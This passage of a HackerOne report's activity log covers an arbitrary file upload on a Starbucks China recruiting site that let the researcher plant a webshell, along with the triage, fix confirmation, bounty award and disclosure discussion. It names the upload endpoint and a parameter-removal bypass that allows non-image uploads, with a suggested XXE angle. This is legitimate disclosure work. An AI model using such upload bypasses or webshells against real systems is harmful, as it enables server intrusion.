stone\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T08:15:06.064Z","updated_at":"2019-03-08T08:15:06.064Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4283836,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write \t\n```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```\nDisclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.\nRegardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)\nBy the way,thks again! @still \nKind regards\njohn stone","markdown_message":"\u003cp\u003ehi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write\u003cbr\u003e\u003cbr\u003e\n\u003ccode\u003eSignificant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).\u003c/code\u003e\u003cbr\u003e\nDisclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.\u003cbr\u003e\nRegardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn\u0026#39;t it? :)\u003cbr\u003e\nBy the way,thks again! \u003ca href=\"/still\"\u003e@still\u003c/a\u003e \u003cbr\u003e\nKind regards\u003cbr\u003e\njohn stone\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T08:23:48.970Z","updated_at":"2019-03-08T08:38:07.864Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4293952,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"is there any update here?","markdown_message":"\u003cp\u003eis there any update here?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-10T09:09:03.377Z","updated_at":"2019-03-10T09:09:03.377Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4303109,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @johnstone,\n\nThank you for your patience. The application team has been notified of this issue and they are now working towards a fix. We've also asked that prior temporary upload files be deleted. We will update you when a fix has been applied. ","markdown_message":"\u003cp\u003eHello \u003ca href=\"/johnstone\"\u003e@johnstone\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your patience. The application team has been notified of this issue and they are now working towards a fix. We\u0026#39;ve also asked that prior temporary upload files be deleted. We will update you when a fix has been applied. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-11T20:44:05.772Z","updated_at":"2019-03-11T20:44:05.772Z","actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4303726,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thank you @coldbr3w ","markdown_message":"\u003cp\u003ethank you \u003ca href=\"/coldbr3w\"\u003e@coldbr3w\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-11T23:19:13.550Z","updated_at":"2019-03-11T23:19:13.550Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4303775,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I found the webshell was deleted","markdown_message":"\u003cp\u003eI found the webshell was deleted\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-11T23:33:33.154Z","updated_at":"2019-03-11T23:33:33.154Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4318119,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @johnstone,\n\nThe team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/johnstone\"\u003e@johnstone\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-13T17:32:26.374Z","updated_at":"2019-03-13T17:32:26.374Z","actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4321581,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml\u0026max_file_size_kb=1024\u0026allow_file_type_list=jpg;gif;png;``` endpoint,\nI found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.\n\n**Recommendations for fix**\n1. Change the upload files to base64\n2. Transcode the base64 data on the server to picture\n3. Check if it is a picture files\n\nThank you @coldbr3w\nKind regards\njohn stone","markdown_message":"\u003cp\u003eHi \u003ca href=\"/coldbr3w\"\u003e@coldbr3w\u003c/a\u003e ,I\u0026#39;m so happy that the vulnerability was fixed,but there have some potential risk on \u003ccode\u003e/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml\u0026amp;max_file_size_kb=1024\u0026amp;allow_file_type_list=jpg;gif;png;\u003c/code\u003e endpoint,\u003cbr\u003e\nI found delete the \u003ccode\u003eallow_file_type_list\u003c/code\u003e parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the \u003ccode\u003ehxsm_file_upload_process.hxpage.xhtml\u003c/code\u003e endpoit did\u0026#39;t checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRecommendations for fix\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eChange the upload files to base64\u003c/li\u003e\n\u003cli\u003eTranscode the base64 data on the server to picture\u003c/li\u003e\n\u003cli\u003eCheck if it is a picture files\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThank you \u003ca href=\"/coldbr3w\"\u003e@coldbr3w\u003c/a\u003e\u003cbr\u003e\nKind regards\u003cbr\u003e\njohn stone\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-14T08:57:52.164Z","updated_at":"2019-03-14T08:59:50.767Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4328733,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.","markdown_message":"\u003cp\u003ehi \u003ca href=\"/coldbr3w\"\u003e@coldbr3w\u003c/a\u003e .After a few days of testing, I found that the vulnerability seems to have been fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-15T08:49:33.855Z","updated_at":"2019-03-15T08:49:33.855Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4337437,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks\nKind regards\nJohn stone","markdown_message":"\u003cp\u003eHi \u003ca href=\"/coldbr3w\"\u003e@coldbr3w\u003c/a\u003e.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks\u003cbr\u003e\nKind regards\u003cbr\u003e\nJohn stone\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-16T16:35:33.393Z","updated_at":"2019-03-16T16:35:33.393Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4344472,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update in this report?","markdown_message":"\u003cp\u003eAny update in this report?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-18T09:57:14.959Z","updated_at":"2019-03-18T09:57:14.959Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4361274,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for your patience @johnstone and confirming that a fix has been applied. We plan to award bounties for your recent submissions in the coming week and look forward to working with you again in the future.","markdown_message":"\u003cp\u003eThank you for your patience \u003ca href=\"/johnstone\"\u003e@johnstone\u003c/a\u003e and confirming that a fix has been applied. We plan to award bounties for your recent submissions in the coming week and look forward to working with you again in the future.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-20T17:47:02.045Z","updated_at":"2019-03-20T17:47:02.045Z","actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"johnstone","url":"/johnstone"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4363388,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you @coldbr3w :)","markdown_message":"\u003cp\u003eThank you \u003ca href=\"/coldbr3w\"\u003e@coldbr3w\u003c/a\u003e :)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-20T22:54:23.329Z","updated_at":"2019-03-20T22:54:23.329Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4386311,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-25T14:34:05.513Z","updated_at":"2019-03-25T14:34:05.513Z","additional_data":{"old_title":"Get the webshell on the starbucks's server via bypass the uploaded limited","new_title":"Webshell via File Upload on ecjobs.starbucks.com.cn"},"actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4416615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,@coldbr3w,May i disclourse the report?\nis today the day to pay the bounty to me? :) My lucky day？","markdown_message":"\u003cp\u003eHi,@coldbr3w,May i disclourse the report?\u003cbr\u003e\nis today the day to pay the bounty to me? :) My lucky day？\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-29T02:09:17.554Z","updated_at":"2019-03-29T02:09:17.554Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4416617,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-29T02:09:35.831Z","updated_at":"2019-03-29T02:09:35.831Z","first_to_agree":true,"actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4467816,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @johnstone,\n\nAlthough this asset is not explicitly included in the bounty program's scope, we award bounties for reports demonstrating \"significant information disclosure\" against other assets. The ability to remotely execute code on a system (RCE) generally allows significant information disclosure. As such, we have determined that this report is eligible for a bounty. In the meantime, we're working on updating the program scope to explicitly identify reports demonstrating RCE as bounty eligible.\n\nThanks again for the report!\n@shadegrown ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/johnstone\"\u003e@johnstone\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eAlthough this asset is not explicitly included in the bounty program\u0026#39;s scope, we award bounties for reports demonstrating \u0026quot;significant information disclosure\u0026quot; against other assets. The ability to remotely execute code on a system (RCE) generally allows significant information disclosure. As such, we have determined that this report is eligible for a bounty. In the meantime, we\u0026#39;re working on updating the program scope to explicitly identify reports demonstrating RCE as bounty eligible.\u003c/p\u003e\n\n\u003cp\u003eThanks again for the report!\u003cbr\u003e\n\u003ca href=\"/shadegrown\"\u003e@shadegrown\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-03T22:57:23.336Z","updated_at":"2019-04-03T22:57:23.336Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Starbucks"}},"bounty_amount":"4000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"johnstone","url":"/johnstone"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4467818,"is_internal":false,"editable":false,"type":"Activities::CancelledDisclosureRequest","message":"Also, we'd like to hold off on disclosing any reports for this site until our China team has a chance to fix all of the related issues and make sure the site is a little more stable. At that point, we'll be happy to work with you to disclose this report. Let's plan to check back in on this in 3 months and reevaluate whether the timing is right for disclosure.\n\nThanks!\n@shadegrown ","markdown_message":"\u003cp\u003eAlso, we\u0026#39;d like to hold off on disclosing any reports for this site until our China team has a chance to fix all of the related issues and make sure the site is a little more stable. At that point, we\u0026#39;ll be happy to work with you to disclose this report. Let\u0026#39;s plan to check back in on this in 3 months and reevaluate whether the timing is right for disclosure.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\n\u003ca href=\"/shadegrown\"\u003e@shadegrown\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-03T22:57:53.789Z","updated_at":"2019-04-03T22:57:53.789Z","actor":{"username":"shadegrown","cleared":false,"url":"/shadegrown","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/241/256/c58560470742940abd59de20f14746b5f8b2dcd2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4477152,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.\nThanks!\n@johnstone ","markdown_message":"\u003cp\u003eThank you \u003ca href=\"/shadegrown\"\u003e@shadegrown\u003c/a\u003e ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.\u003cbr\u003e\nThanks!\u003cbr\u003e\n\u003ca href=\"/johnstone\"\u003e@johnstone\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-04T14:56:18.228Z","updated_at":"2019-04-04T14:56:18.228Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6074395,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-18T15:17:48.875Z","updated_at":"2019-10-18T15:17:48.875Z","first_to_agree":true,"actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6293290,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-13T00:38:41.500Z","updated_at":"2019-11-13T00:38:41.500Z","actor":{"username":"agedsumatra","cleared":false,"url":"/agedsumatra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6293291,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-13T00:38:41.619Z","updated_at":"2019-11-13T00:38:41.619Z","actor":{"username":"agedsumatra","cleared":false,"url":"/agedsumatra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9014941,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-08-23T15:30:41.515Z","updated_at":"2020-08-23T15:30:41.515Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"email":"jo************************om","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9014950,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-08-23T15:33:37.447Z","updated_at":"2020-08-23T15:33:37.447Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"email":"jo**************************om","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9014962,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-08-23T15:35:47.215Z","updated_at":"2020-08-23T15:35:47.215Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"email":"ag**************************om","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9014967,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-08-23T15:38:19.558Z","updated_at":"2020-08-23T15:38:19.558Z","actor":{"username":"johnstone","cleared":false,"url":"/johnstone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"email":"jo************************om","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":18863,"category":"team","content":"johnstone discovered An arbitrary file upload via the resume functionality at https://ecjobs.starbucks.com.cn which led to arbitrary code execution by uploading a webshell.\n@johnstone   — thank for reporting this vulnerability, your patience while we followed up on the issue internally and for your additional effort to confirm the resolution.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003ejohnstone discovered An arbitrary file upload via the resume functionality at \u003ca title=\"https://ecjobs.starbucks.com.cn\" href=\"/redirect?url=https%3A%2F%2Fecjobs.starbucks.com.cn\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://ecjobs.starbucks.com.cn\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which led to arbitrary code execution by uploading a webshell.\u003cbr\u003e\n\u003ca href=\"/johnstone\"\u003e@johnstone\u003c/a\u003e   — thank for reporting this vulnerability, your patience while we followed up on the issue internally and for your additional effort to confirm the resolution.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}